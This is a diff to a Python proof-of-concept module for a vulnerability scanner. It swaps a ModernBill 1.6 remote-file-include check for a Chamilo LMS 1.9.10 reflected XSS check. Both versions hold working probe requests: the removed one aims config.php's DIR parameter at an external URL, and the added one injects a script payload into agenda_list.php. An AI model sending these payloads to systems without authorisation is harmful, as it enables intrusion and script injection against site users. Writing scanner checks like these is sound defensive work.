@@ -2,31 +2,31 @@
 
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import re
+import urllib.request
+import urllib.error
+import urllib.parse
 
 
 class Vuln(ABVuln):
-    vuln_id = 'Modernbill_0000'  # 平台漏洞编号
-    # 漏洞名称
-    name = 'Modernbill <= 1.6 (config.php) Remote File Include Vulnerability'
-    level = VulnLevel.MED  # 漏洞危害级别
-    type = VulnType.LFI  # 漏洞类型
-    disclosure_date = '2006-08-09'  # 漏洞公布时间
+    vuln_id = 'Chamilo-LMS_0001'  # 平台漏洞编号，留空
+    name = 'Chamilo LMS 1.9.10 跨站脚本漏洞'  # 漏洞名称
+    level = VulnLevel.HIGH  # 漏洞危害级别
+    type = VulnType.XSS  # 漏洞类型
+    disclosure_date = '2015-03-19'  # 漏洞公布时间
     desc = '''
-        ModernGigabyte ModernBill 1.6的include/html/config.php脚本存在PHP远程文件包含漏洞，远程攻击者可借助DIR参数中的URL执行任意PHP代码。
-        Modernbill <= 1.6 (config.php)文件存在远程文件包含漏洞。
+        Chamilo LMS 1.9.10 /main/calendar/agenda_list.php 跨站脚本漏洞。
     '''  # 漏洞描述
-    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2006-6105'
-    cnvd_id = 'CNVD-2006-6105'  # cnvd漏洞编号
-    cve_id = 'CVE-2006-4034'  # cve编号
-    product = 'Modernbill'  # 漏洞组件名称
-    product_version = '<= 1.6'  # 漏洞应用版本
+    ref = 'https://www.exploit-db.com/exploits/36435/'  # 漏洞来源
+    cnvd_id = 'Unknown'  # cnvd漏洞编号
+    cve_id = 'Unknown'  # cve编号
+    product = 'Chamilo-LMS'  # 漏洞应用名称
+    product_version = 'Chamilo LMS 1.9.10'  # 漏洞应用版本
 
 
 class Poc(ABPoc):
-    poc_id = '15400ded-8b24-4dca-95ba-9f39205a2d46'  # 平台 POC 编号
-    author = '国光'  # POC编写者
-    create_date = '2018-06-01'  # POC创建时间
+    poc_id = '933b05b8-5bde-45d5-84e0-666d6f7ff9f4'
+    author = 'cscan'  # POC编写者
+    create_date = '2018-05-05'  # POC创建时间
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
@@ -49,10 +49,14 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            arg = '{target}'.format(target=self.target)
-            vul_url = arg + '/include/html/config.php?DIR=http://baidu.com/robots.txt?'
-            response = requests.get(vul_url).text
-            if 'Baiduspider' in response or 'Googlebot' in response:
+
+            url = self.target + '/main/calendar/agenda_list.php'
+            verify_url = url + '?type=personal%27%3E%3Cscript%3Econfirm%281%29%3C%2fscript%3E%3C%21--'
+            request = urllib.request.Request(verify_url)
+            response = urllib.request.urlopen(request)
+
+            content = str(response.read())
+            if "<script>confirm(1)</script>" in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
